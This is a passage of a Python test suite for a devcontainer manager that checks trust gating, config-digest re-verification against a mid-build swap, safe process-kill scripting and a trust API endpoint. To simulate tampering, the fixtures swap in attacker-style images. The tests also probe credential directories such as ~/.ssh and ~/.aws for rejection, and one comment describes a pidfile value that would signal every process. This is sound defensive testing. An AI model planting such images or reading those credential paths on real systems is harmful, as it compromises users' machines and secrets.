                '{"type":"text","level":2,"text":"done"}',
            ]
        )
        result = devc.DevcontainerManager._parse_up_output(stdout)
        assert result["outcome"] == "success"
        assert result["containerId"] == "abc123"
        assert result["remoteWorkspaceFolder"] == "/workspaces/p"

    def test_trailing_log_records_do_not_hide_the_result(self) -> None:
        stdout = (
            '{"outcome":"success","containerId":"c1"}\n'
            '{"type":"text","text":"tail"}\n'
            '{"type":"text","text":"more tail"}\n'
        )
        assert devc.DevcontainerManager._parse_up_output(stdout)["containerId"] == "c1"

    def test_empty_dict_on_garbage(self) -> None:
        assert devc.DevcontainerManager._parse_up_output("boom: not json\n") == {}

    def test_empty_dict_on_empty_stdout(self) -> None:
        assert devc.DevcontainerManager._parse_up_output("") == {}
        assert devc.DevcontainerManager._parse_up_output("   \n\n") == {}

    def test_empty_dict_when_no_object_carries_outcome(self) -> None:
        stdout = '{"type":"text","text":"a"}\n{"type":"text","text":"b"}\n'
        assert devc.DevcontainerManager._parse_up_output(stdout) == {}

    def test_json_array_line_is_ignored(self) -> None:
        """Only objects count — a bare array can never be the result record."""
        assert devc.DevcontainerManager._parse_up_output('["outcome"]\n') == {}


# ---------------------------------------------------------------------------
# up() trust gate
# ---------------------------------------------------------------------------


class TestUpTrustGate:
    @pytest.fixture
    def no_subprocess(self, monkeypatch: pytest.MonkeyPatch) -> list[tuple]:
        """Any spawn attempt fails the test rather than reaching Docker."""
        spawned: list[tuple] = []

        async def boom(*argv, **kw):  # type: ignore[no-untyped-def]
            spawned.append(argv)
            raise AssertionError(f"unexpected subprocess spawn: {argv!r}")

        monkeypatch.setattr(asyncio, "create_subprocess_exec", boom)
        return spawned

    @pytest.mark.asyncio
    async def test_untrusted_raises_before_any_subprocess(
        self, tmp_path: Path, trust_home: Path, no_subprocess: list[tuple]
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)

        with pytest.raises(devc.DevcontainerNotTrusted):
            await devc.DevcontainerManager().up(project)
        assert no_subprocess == []

    @pytest.mark.asyncio
    async def test_revoked_grant_raises_again(
        self, tmp_path: Path, trust_home: Path, no_subprocess: list[tuple]
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        devc.grant_trust(project)
        devc.revoke_trust(project)

        with pytest.raises(devc.DevcontainerNotTrusted):
            await devc.DevcontainerManager().up(project)
        assert no_subprocess == []

    @pytest.mark.asyncio
    async def test_edited_config_invalidates_trust_before_spawn(
        self, tmp_path: Path, trust_home: Path, no_subprocess: list[tuple]
    ) -> None:
        """The trust-then-edit race is closed at the gate, not after the build."""
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        devc.grant_trust(project)
        cfg.write_bytes(b'{"image": "attacker/img:latest"}')

        with pytest.raises(devc.DevcontainerNotTrusted):
            await devc.DevcontainerManager().up(project)
        assert no_subprocess == []

    @pytest.mark.asyncio
    async def test_missing_config_raises_plain_error_before_spawn(
        self, tmp_path: Path, trust_home: Path, no_subprocess: list[tuple]
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        with pytest.raises(devc.DevcontainerError) as exc:
            await devc.DevcontainerManager().up(project)
        assert not isinstance(exc.value, devc.DevcontainerNotTrusted)
        assert no_subprocess == []

    @pytest.mark.asyncio
    async def test_rebuild_is_also_trust_gated(
        self, tmp_path: Path, trust_home: Path, no_subprocess: list[tuple]
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        with pytest.raises(devc.DevcontainerNotTrusted):
            await devc.DevcontainerManager().up(project, rebuild=True)
        assert no_subprocess == []


# ---------------------------------------------------------------------------
# up(): post-build digest re-verification + kiro-cli preflight
# ---------------------------------------------------------------------------


@pytest.fixture
def cli_stub(monkeypatch: pytest.MonkeyPatch) -> None:
    """Pin the devcontainer CLI argv so tests don't depend on PATH."""
    monkeypatch.setattr(devc, "_cli_argv", lambda: ["devcontainer"])


class TestUpPostBuildDigestReverification:
    """M3 TOCTOU: the CLI re-reads the config tree during the build.

    REVERT-VERIFIED (M3) — pins the ``post_digest = config_digest(cfg)`` block
    in ``up()`` (the ``if post_digest != digest:`` arm that issues
    ``docker rm -f`` and raises ``DevcontainerNotTrusted``). Delete that block
    and ``test_config_swap_during_build_discards_the_container`` fails twice
    over: ``up()`` returns a ``DevcontainerInfo`` instead of raising, and no
    ``docker rm -f`` is ever issued, so a session is handed a container built
    from bytes no human ever saw. The pre-build gate in
    ``TestUpTrustGate`` cannot catch this: the swap lands *after* it.
    """

    @pytest.mark.asyncio
    async def test_config_swap_during_build_discards_the_container(
        self,
        tmp_path: Path,
        trust_home: Path,
        cli_stub: None,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        devc.grant_trust(project)

        def swap() -> None:
            # Lands while `devcontainer up` is in flight — i.e. after the
            # pre-build trust check and inside the window where the CLI does
            # its own read of the tree.
            cfg.write_bytes(b'{"image": "attacker/img:latest"}')

        rec = _ExecRecorder(_up_ok("cid-toctou", on_communicate=swap))
        monkeypatch.setattr(asyncio, "create_subprocess_exec", rec)

        mgr = devc.DevcontainerManager()
        with pytest.raises(devc.DevcontainerNotTrusted, match="changed during the build"):
            await mgr.up(project)

        assert rec.calls[0][:2] == ["devcontainer", "up"]
        assert ["docker", "rm", "-f", "cid-toctou"] in rec.calls
        # No kiro-cli preflight, and nothing cached for a later session.
        assert not any("command -v kiro-cli" in c for call in rec.calls for c in call)
        assert mgr._infos == {}

    @pytest.mark.asyncio
    async def test_swap_with_no_container_id_still_refuses(
        self,
        tmp_path: Path,
        trust_home: Path,
        cli_stub: None,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """A success record without containerId must not crash the teardown."""
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        devc.grant_trust(project)

        record = json.dumps({"outcome": "success", "remoteWorkspaceFolder": "/w"})
        proc = _FakeProc(
            stdout=(record + "\n").encode(),
            on_communicate=lambda: cfg.write_bytes(b'{"image": "evil"}'),
        )
        rec = _ExecRecorder(proc)
        monkeypatch.setattr(asyncio, "create_subprocess_exec", rec)

        with pytest.raises(devc.DevcontainerNotTrusted):
            await devc.DevcontainerManager().up(project)
        assert not any(call[:3] == ["docker", "rm", "-f"] for call in rec.calls)

    @pytest.mark.asyncio
    async def test_stable_config_reaches_the_preflight_and_caches_the_info(
        self,
        tmp_path: Path,
        trust_home: Path,
        cli_stub: None,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        digest = devc.grant_trust(project)

        rec = _ExecRecorder(_up_ok("cid-ok"), _FakeProc(returncode=0))
        monkeypatch.setattr(asyncio, "create_subprocess_exec", rec)

        mgr = devc.DevcontainerManager()
        info = await mgr.up(project)

        assert info.container_id == "cid-ok"
        assert info.remote_workspace_folder == "/workspaces/proj"
        assert info.remote_user == "vscode"
        assert info.config_digest == digest == devc.config_digest(cfg)
        assert mgr._infos[os.path.realpath(str(project))] is info
        # Second call is the kiro-cli preflight probe, not a teardown.
        assert rec.calls[1][:3] == ["docker", "exec", "cid-ok"]
        assert "command -v kiro-cli" in rec.calls[1]

    @pytest.mark.asyncio
    async def test_missing_kiro_cli_fails_with_an_install_hint(
        self,
        tmp_path: Path,
        trust_home: Path,
        cli_stub: None,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """N1: a bare exec-127 surfaces as a generic ACP init failure."""
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        devc.grant_trust(project)

        rec = _ExecRecorder(_up_ok("cid-nocli"), _FakeProc(returncode=127))
        monkeypatch.setattr(asyncio, "create_subprocess_exec", rec)

        mgr = devc.DevcontainerManager()
        with pytest.raises(devc.DevcontainerError, match="kiro-cli is not installed"):
            await mgr.up(project)
        assert mgr._infos == {}


# ---------------------------------------------------------------------------
# kill_exec
# ---------------------------------------------------------------------------


class TestKillExec:
    """M1: the kill target is discovered from /proc/<pid>/environ, not a file.

    REVERT-VERIFIED (M1) — pins the environ scan
    (``for E in /proc/[0-9]*/environ; do ... grep -qx
    "$DEVCONTAINER_EXEC_ENV=<exec_id>"``) and the pidfile validation
    (``case "$P" in ""|*[!0-9]*|0*|1) exit 0;; esac``) in
    ``DevcontainerManager.kill_exec``. Revert to reading the pidfile
    unconditionally and ``test_environ_scan_is_the_primary_discovery`` fails
    (no ``/proc`` scan in the script) and
    ``test_pidfile_is_only_a_fallback`` fails (the ``cat`` is no longer
    behind ``[ -z "$PIDS" ]``). Drop the ``case`` validation and
    ``test_pidfile_fallback_rejects_unsafe_values`` fails — a container-side
    process could write ``1`` into the pidfile and turn the group kill into
    ``kill -TERM -1``, i.e. signal everything in the container.
    """

    @staticmethod
    async def _script(monkeypatch: pytest.MonkeyPatch, exec_id: str) -> tuple[str, list[list[str]]]:
        rec = _ExecRecorder(_FakeProc())
        monkeypatch.setattr(asyncio, "create_subprocess_exec", rec)
        await devc.DevcontainerManager().kill_exec(_info(container_id="cid"), exec_id)
        argv = rec.calls[0]
        assert argv[:4] == ["docker", "exec", "cid", "sh"]
        assert argv[4] == "-c"
        return argv[5], rec.calls

    @pytest.mark.asyncio
    async def test_environ_scan_is_the_primary_discovery(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        exec_id = uuid.uuid4().hex
        script, _ = await self._script(monkeypatch, exec_id)
        assert "for E in /proc/[0-9]*/environ" in script
        assert 'tr "\\0" "\\n"' in script
        assert f'grep -qx "{devc.DEVCONTAINER_EXEC_ENV}={exec_id}"' in script
        # The environ block is fixed at exec time, so the scan is the
        # authoritative source and must run before any fallback.
        assert script.index("/proc/[0-9]*/environ") < script.index("cat /tmp/kirocrew-exec")

    @pytest.mark.asyncio
    async def test_pidfile_is_only_a_fallback(self, monkeypatch: pytest.MonkeyPatch) -> None:
        exec_id = uuid.uuid4().hex
        script, _ = await self._script(monkeypatch, exec_id)
        pidfile = f"/tmp/kirocrew-exec/{exec_id}.pid"
        assert f"cat {pidfile}" in script
        assert script.index('if [ -z "$PIDS" ]') < script.index(f"cat {pidfile}")

    @pytest.mark.asyncio
    async def test_pidfile_fallback_rejects_unsafe_values(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        script, _ = await self._script(monkeypatch, uuid.uuid4().hex)
        # ""  -> empty; *[!0-9]* -> non-numeric; 0* -> leading zero;
        # 1   -> PID 1, whose group kill is `kill -TERM -1` (signal all).
        assert 'case "$P" in ""|*[!0-9]*|0*|1) exit 0;; esac' in script

    @pytest.mark.asyncio
    async def test_group_kill_escalates_term_then_kill(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        script, _ = await self._script(monkeypatch, uuid.uuid4().hex)
        assert 'kill -TERM -"$P"' in script
        assert 'kill -KILL -"$P"' in script
        assert script.index("kill -TERM") < script.index("kill -KILL")

    @pytest.mark.asyncio
    async def test_exec_id_is_interpolated_as_uuid_hex_only(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Injection safety premise: exec_id is never caller-supplied text.

        The script interpolates exec_id unquoted into a pidfile path, so the
        value must be hex. Both halves are asserted: the gateway's generator,
        and that every occurrence in the script is that bare hex string.
        """
        from kiro_crew.acp import client as acp_client

        # encoding pinned: client.py carries non-ASCII prose (em dashes, box
        # rules), and read_text() without it decodes through the locale codec
        # (cp1252 on Windows) and raises UnicodeDecodeError.
        src = Path(acp_client.__file__).read_text(encoding="utf-8")
        assert "self._devcontainer_exec_id = uuid.uuid4().hex" in src

        exec_id = uuid.uuid4().hex
        assert re.fullmatch(r"[0-9a-f]{32}", exec_id)
        script, _ = await self._script(monkeypatch, exec_id)
        # Exactly three uses: the grep pattern, the pidfile read, the unlink.
        assert len(re.findall(re.escape(exec_id), script)) == 3
        # No shell metacharacter can ride in on the id.
        assert not set(exec_id) & set(" \t\n'\"$`;&|<>()*?[]{}\\")

    @pytest.mark.asyncio
    async def test_pidfile_is_removed_after_the_kill(self, monkeypatch: pytest.MonkeyPatch) -> None:
        exec_id = uuid.uuid4().hex
        script, _ = await self._script(monkeypatch, exec_id)
        assert script.rstrip().endswith(f"rm -f /tmp/kirocrew-exec/{exec_id}.pid")


# ---------------------------------------------------------------------------
# status() / down(): id-label fallback and the enabled flag
# ---------------------------------------------------------------------------


def _pin_mode(monkeypatch: pytest.MonkeyPatch, mode: str) -> None:
    """Pin ``agent.devcontainer`` without touching the real data home."""
    from kiro_crew.config.loader import KiroCrewConfig

    monkeypatch.setattr(
        KiroCrewConfig,
        "load",
        classmethod(lambda cls: SimpleNamespace(agent=SimpleNamespace(devcontainer=mode))),
    )


class TestStatus:
    """M5 (label fallback after a gateway restart) and M4 (enabled flag)."""

    @pytest.mark.asyncio
    async def test_cold_cache_finds_a_live_container_by_label(
        self,
        tmp_path: Path,
        trust_home: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        _pin_mode(monkeypatch, "auto")

        rec = _ExecRecorder(_FakeProc(stdout=b"cid-live\n"))
        monkeypatch.setattr(asyncio, "create_subprocess_exec", rec)

        out = await devc.DevcontainerManager().status(project)
        assert out["container_id"] == "cid-live"
        assert out["running"] is True
        assert out["has_config"] is True
        assert rec.calls[0][:4] == ["docker", "ps", "-q", "--filter"]
        assert rec.calls[0][4].startswith("label=kirocrew.devcontainer=")

    @pytest.mark.asyncio
    async def test_cold_cache_with_no_container_reports_not_running(
        self,
        tmp_path: Path,
        trust_home: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        _pin_mode(monkeypatch, "auto")
        monkeypatch.setattr(asyncio, "create_subprocess_exec", _ExecRecorder(_FakeProc()))

        out = await devc.DevcontainerManager().status(project)
        assert out["container_id"] is None
        assert out["running"] is False

    @pytest.mark.asyncio
    async def test_no_label_lookup_without_a_config(
        self,
        tmp_path: Path,
        trust_home: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        _pin_mode(monkeypatch, "auto")
        rec = _ExecRecorder()
        monkeypatch.setattr(asyncio, "create_subprocess_exec", rec)

        out = await devc.DevcontainerManager().status(project)
        assert out["has_config"] is False
        assert out["trusted"] is False
        assert rec.calls == []

    @pytest.mark.asyncio
    async def test_warm_cache_uses_inspect_not_the_label(
        self,
        tmp_path: Path,
        trust_home: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        _pin_mode(monkeypatch, "auto")

        mgr = devc.DevcontainerManager()
        key = os.path.realpath(str(project))
        mgr._infos[key] = _info(container_id="cid-cached", project_dir=key)
        rec = _ExecRecorder(_FakeProc(stdout=b"true\n"))
        monkeypatch.setattr(asyncio, "create_subprocess_exec", rec)

        out = await mgr.status(project)
        assert out["container_id"] == "cid-cached"
        assert out["running"] is True
        assert out["remote_workspace_folder"] == "/workspaces/proj"
        assert rec.calls[0][:2] == ["docker", "inspect"]
        assert not any("--filter" in call for call in rec.calls)

    @pytest.mark.asyncio
    async def test_enabled_is_false_when_the_mode_is_off(
        self,
        tmp_path: Path,
        trust_home: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """M4: the frontend must not show a trust prompt for an inert feature."""
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        _pin_mode(monkeypatch, "off")
        monkeypatch.setattr(asyncio, "create_subprocess_exec", _ExecRecorder(_FakeProc()))

        out = await devc.DevcontainerManager().status(project)
        assert out["enabled"] is False
        assert out["has_config"] is True  # the config is still reported

    @pytest.mark.asyncio
    async def test_enabled_is_true_only_for_auto(
        self,
        tmp_path: Path,
        trust_home: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        monkeypatch.setattr(asyncio, "create_subprocess_exec", _ExecRecorder(_FakeProc()))

        for mode, expected in (("auto", True), ("off", False), ("", False), ("Auto", False)):
            _pin_mode(monkeypatch, mode)
            out = await devc.DevcontainerManager().status(project)
            assert out["enabled"] is expected, mode

    @pytest.mark.asyncio
    async def test_unloadable_config_does_not_break_status(
        self,
        tmp_path: Path,
        trust_home: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        from kiro_crew.config.loader import KiroCrewConfig

        def boom(cls):  # type: ignore[no-untyped-def]
            raise RuntimeError("config unreadable")

        monkeypatch.setattr(KiroCrewConfig, "load", classmethod(boom))
        project = tmp_path / "proj"
        project.mkdir()
        monkeypatch.setattr(asyncio, "create_subprocess_exec", _ExecRecorder())

        out = await devc.DevcontainerManager().status(project)
        assert out["enabled"] is False


class TestDown:
    """M5: a container must never become unreapable after a gateway restart."""

    @pytest.mark.asyncio
    async def test_cold_cache_removes_by_label(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        rec = _ExecRecorder(_FakeProc(stdout=b"cid-orphan\n"), _FakeProc(returncode=0))
        monkeypatch.setattr(asyncio, "create_subprocess_exec", rec)

        assert await devc.DevcontainerManager().down(tmp_path) is True
        assert rec.calls[0][:3] == ["docker", "ps", "-q"]
        assert rec.calls[1] == ["docker", "rm", "-f", "cid-orphan"]

    @pytest.mark.asyncio
    async def test_warm_cache_removes_without_a_label_lookup(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        mgr = devc.DevcontainerManager()
        key = os.path.realpath(str(tmp_path))
        mgr._infos[key] = _info(container_id="cid-cached", project_dir=key)
        rec = _ExecRecorder(_FakeProc(returncode=0))
        monkeypatch.setattr(asyncio, "create_subprocess_exec", rec)

        assert await mgr.down(tmp_path) is True
        assert rec.calls == [["docker", "rm", "-f", "cid-cached"]]
        assert mgr._infos == {}

    @pytest.mark.asyncio
    async def test_no_container_anywhere_is_a_false_not_an_error(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        rec = _ExecRecorder(_FakeProc(stdout=b"\n"))
        monkeypatch.setattr(asyncio, "create_subprocess_exec", rec)

        assert await devc.DevcontainerManager().down(tmp_path) is False
        assert len(rec.calls) == 1  # no rm attempted

    @pytest.mark.asyncio
    async def test_failed_removal_reports_false(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        rec = _ExecRecorder(_FakeProc(stdout=b"cid\n"), _FakeProc(returncode=1))
        monkeypatch.setattr(asyncio, "create_subprocess_exec", rec)
        assert await devc.DevcontainerManager().down(tmp_path) is False


# ---------------------------------------------------------------------------
# M2: AcpClient devcontainer state is reset with the process
# ---------------------------------------------------------------------------


class TestAcpClientDevcontainerStateReset:
    """M2: stale devcontainer state would misroute cwd and the kill path.

    ``_reset_state`` runs after the kiro-cli process is dead. A retained
    ``_devcontainer_info`` would make the next ``_acp_cwd`` report a
    container-side path for a host-side respawn, and a retained
    ``_devcontainer_exec_id`` would aim ``kill_exec`` at a pidfile belonging
    to a dead exec.
    """

    def _client(self):  # type: ignore[no-untyped-def]
        from kiro_crew.acp.client import AcpClient

        client = AcpClient()
        client._process = None
        client._pid = None
        client._child_pids = {}
        return client

    def test_fresh_client_has_both_attributes_unset(self) -> None:
        client = self._client()
        assert client._devcontainer_info is None
        assert client._devcontainer_exec_id is None

    def test_reset_state_clears_both_attributes(self) -> None:
        client = self._client()
        client._devcontainer_info = _info()
        client._devcontainer_exec_id = uuid.uuid4().hex

        client._reset_state()

        assert client._devcontainer_info is None
        assert client._devcontainer_exec_id is None


class TestIdLabel:
    def test_id_label_is_stable_and_per_project(self) -> None:
        a = devc.DevcontainerManager._id_label("/host/a")
        assert a == devc.DevcontainerManager._id_label("/host/a")
        assert a != devc.DevcontainerManager._id_label("/host/b")
        key, _, digest = a.partition("=")
        assert key == "kirocrew.devcontainer"
        assert len(digest) == 24


class TestGetManager:
    def test_get_manager_is_a_singleton(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(devc, "_manager", None)
        first = devc.get_manager()
        assert devc.get_manager() is first


# ---------------------------------------------------------------------------
# Handler: project-path admission
# ---------------------------------------------------------------------------


def _request(*projects: str) -> SimpleNamespace:
    """Minimal request whose app state exposes chat slots with projects."""
    slots = {f"s{i}": SimpleNamespace(project=p) for i, p in enumerate(projects)}
    return SimpleNamespace(app={"state": SimpleNamespace(chat_slots=slots)})


class TestResolveProject:
    @pytest.mark.asyncio
    async def test_accepts_a_live_slot_project(self, tmp_path: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        got = await devc_handlers._resolve_project(_request(str(project)), str(project))
        assert got == os.path.realpath(str(project))

    @pytest.mark.asyncio
    async def test_accepts_a_realpath_match_through_a_symlink(
        self, tmp_path: Path, symlinks_supported: None
    ) -> None:
        """Callers may hand over any spelling; admission is by realpath."""
        real = tmp_path / "real"
        real.mkdir()
        link = tmp_path / "link"
        link.symlink_to(real, target_is_directory=True)

        got = await devc_handlers._resolve_project(_request(str(real)), str(link))
        assert got == os.path.realpath(str(real))

    @pytest.mark.asyncio
    async def test_accepts_a_non_normalized_spelling(self, tmp_path: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        spelled = str(tmp_path / "proj" / "." / ".." / "proj")
        got = await devc_handlers._resolve_project(_request(str(project)), spelled)
        assert got == os.path.realpath(str(project))

    @pytest.mark.asyncio
    async def test_rejects_a_path_no_slot_is_scoped_to(self, tmp_path: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        other = tmp_path / "other"
        other.mkdir()
        assert await devc_handlers._resolve_project(_request(str(project)), str(other)) is None

    @pytest.mark.asyncio
    async def test_rejects_a_subdirectory_of_a_slot_project(self, tmp_path: Path) -> None:
        """Admission is exact-match, not prefix-match."""
        project = tmp_path / "proj"
        (project / "sub").mkdir(parents=True)
        assert (
            await devc_handlers._resolve_project(_request(str(project)), str(project / "sub"))
            is None
        )

    @pytest.mark.asyncio
    async def test_rejects_arbitrary_host_paths(self, tmp_path: Path) -> None:
        """Slot-project matching is the only admission rule, so credential and
        system directories are refused for the same reason /nowhere is: no
        session is scoped to them, so trusting or probing them is meaningless."""
        project = tmp_path / "proj"
        project.mkdir()
        for probe in ("~/.ssh", "/etc", str(Path.home() / ".aws"), "/nonexistent/x"):
            assert await devc_handlers._resolve_project(_request(str(project)), probe) is None

    @pytest.mark.asyncio
    async def test_rejects_blank_and_non_string_input(self, tmp_path: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        req = _request(str(project))
        for raw in (None, "", "   ", 17, ["/tmp"], {}):
            assert await devc_handlers._resolve_project(req, raw) is None

    @pytest.mark.asyncio
    async def test_rejects_everything_when_no_slots_exist(self, tmp_path: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        empty = SimpleNamespace(app={"state": SimpleNamespace(chat_slots={})})
        assert await devc_handlers._resolve_project(empty, str(project)) is None

    @pytest.mark.asyncio
    async def test_missing_state_is_not_a_crash(self, tmp_path: Path) -> None:
        stateless = SimpleNamespace(app={})
        assert await devc_handlers._resolve_project(stateless, str(tmp_path)) is None

    @pytest.mark.asyncio
    async def test_surrounding_whitespace_is_stripped(self, tmp_path: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        got = await devc_handlers._resolve_project(_request(str(project)), f"  {project}  ")
        assert got == os.path.realpath(str(project))


class TestSlotProjectRoots:
    def test_skips_slots_without_a_usable_project(self, tmp_path: Path) -> None:
        state = SimpleNamespace(
            chat_slots={
                "a": SimpleNamespace(project=str(tmp_path)),
                "b": SimpleNamespace(project=None),
                "c": SimpleNamespace(project=""),
                "d": SimpleNamespace(project=123),
                "e": SimpleNamespace(),
            }
        )
        assert devc_handlers._slot_project_roots(state) == {os.path.realpath(str(tmp_path))}

    def test_empty_for_a_stateless_app(self) -> None:
        assert devc_handlers._slot_project_roots(None) == set()
        assert devc_handlers._slot_project_roots(SimpleNamespace(chat_slots=None)) == set()


# ---------------------------------------------------------------------------
# Handler: POST /api/devcontainer/trust — the reviewed digest is REQUIRED
# ---------------------------------------------------------------------------


class _SelRecorder:
    """Captures ``log_api_access`` calls instead of writing the real audit log."""

    def __init__(self) -> None:
        self.calls: list[dict] = []

    def log_api_access(self, **kw: object) -> None:
        self.calls.append(kw)


def _trust_request(payload: object, *projects: str) -> SimpleNamespace:
    """A dashboard-authenticated request for the trust endpoint.

    Extends ``_request`` (slot-project admission) with the three attributes the
    handler itself reads: ``get`` for the auth claims, ``json`` for the body,
    and ``app`` for the slot state. ``internal_auth`` is the one claim
    ``deny_non_dashboard_caller`` accepts without an owner lookup, so it keeps
    these tests on the handler's own logic rather than the auth middleware's.
    """
    base = _request(*projects)

    async def _json() -> object:
        return payload

    def _get(key: str, default: object = None) -> object:
        return True if key == "internal_auth" else default

    return SimpleNamespace(app=base.app, get=_get, json=_json)


def _body(resp) -> dict:  # type: ignore[no-untyped-def]
    return json.loads(resp.body)


@pytest.fixture
def sel_recorder(monkeypatch: pytest.MonkeyPatch) -> _SelRecorder:
    rec = _SelRecorder()
    monkeypatch.setattr(devc_handlers, "sel", lambda: rec)
    return rec


class TestTrustHandlerDigestBinding:
    """The endpoint must refuse to grant against unreviewed bytes.

    ``grant_trust``'s own guard only fires when a digest is PASSED, so the
    endpoint requiring one is the other half of the fix: an omitted field would
    otherwise fall back to the unbound form and re-open the preview→grant
    window from the network side.
    """

    @pytest.mark.asyncio
    @pytest.mark.parametrize("digest", [None, "", "   ", 17, ["abc"], {"d": "abc"}, True])
    async def test_missing_or_non_string_digest_is_rejected_with_no_grant(
        self,
        tmp_path: Path,
        trust_home: Path,
        sel_recorder: _SelRecorder,
        digest: object,
    ) -> None:
        """REVERT-VERIFIED against the ``digest_required`` screen in
        ``api_devcontainer_trust``: without it a body carrying no digest grants
        against whatever is on disk, so the status flips to 200 and the trust
        store gains an entry."""
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        body: dict = {"project": str(project)}
        if digest is not None:
            body["digest"] = digest

        resp = await devc_handlers.api_devcontainer_trust(_trust_request(body, str(project)))

        assert resp.status == 400
        assert _body(resp)["code"] == "digest_required"
        assert devc.is_trusted(project) is False
        assert not (trust_home / "devcontainers" / "trust.json").exists()

    @pytest.mark.asyncio
    async def test_stale_digest_is_409_with_a_denied_audit_event(
        self, tmp_path: Path, trust_home: Path, sel_recorder: _SelRecorder
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        reviewed = devc.config_digest(cfg)
        cfg.write_bytes(json.dumps({"name": "kirocrew-dev", "image": "evil:latest"}).encode())

        resp = await devc_handlers.api_devcontainer_trust(
            _trust_request({"project": str(project), "digest": reviewed}, str(project))
        )

        assert resp.status == 409
        assert _body(resp)["code"] == "devcontainer_config_changed"
        assert devc.is_trusted(project) is False
        assert not (trust_home / "devcontainers" / "trust.json").exists()
        denied = [c for c in sel_recorder.calls if c.get("outcome") == "denied"]
        assert len(denied) == 1
        assert denied[0]["operation"] == "devcontainer_trust.grant"

    @pytest.mark.asyncio
    async def test_matching_digest_grants_and_audits_success(
        self, tmp_path: Path, trust_home: Path, sel_recorder: _SelRecorder
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        reviewed = devc.config_digest(cfg)

        resp = await devc_handlers.api_devcontainer_trust(
            _trust_request({"project": str(project), "digest": reviewed}, str(project))
        )

        assert resp.status == 200
        assert _body(resp) == {"trusted": True, "digest": reviewed}
        assert devc.is_trusted(project) is True
        store = json.loads(
            (trust_home / "devcontainers" / "trust.json").read_text(encoding="utf-8")
        )
        assert store[os.path.realpath(str(project))]["digest"] == reviewed
        assert [c["outcome"] for c in sel_recorder.calls] == ["success"]

    @pytest.mark.asyncio
    async def test_surrounding_whitespace_in_the_digest_is_stripped(
        self, tmp_path: Path, trust_home: Path, sel_recorder: _SelRecorder
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        reviewed = devc.config_digest(cfg)

        resp = await devc_handlers.api_devcontainer_trust(
            _trust_request({"project": str(project), "digest": f"  {reviewed}\n"}, str(project))
        )
        assert resp.status == 200
        assert devc.is_trusted(project) is True

    @pytest.mark.asyncio
    async def test_project_admission_runs_before_the_digest_screen(
        self, tmp_path: Path, trust_home: Path, sel_recorder: _SelRecorder
    ) -> None:
        """An unknown project is still ``unknown_project``, not
        ``digest_required`` — the weaker error must not leak path admission."""
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        other = tmp_path / "other"
        other.mkdir()

        resp = await devc_handlers.api_devcontainer_trust(
            _trust_request({"project": str(other)}, str(project))
        )
        assert resp.status == 400
        assert _body(resp)["code"] == "unknown_project"

    @pytest.mark.asyncio
    async def test_absent_config_still_maps_to_404(
        self, tmp_path: Path, trust_home: Path, sel_recorder: _SelRecorder
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()

        resp = await devc_handlers.api_devcontainer_trust(
            _trust_request({"project": str(project), "digest": "deadbeef"}, str(project))
        )
        assert resp.status == 404
        assert _body(resp)["code"] == "no_devcontainer_config"
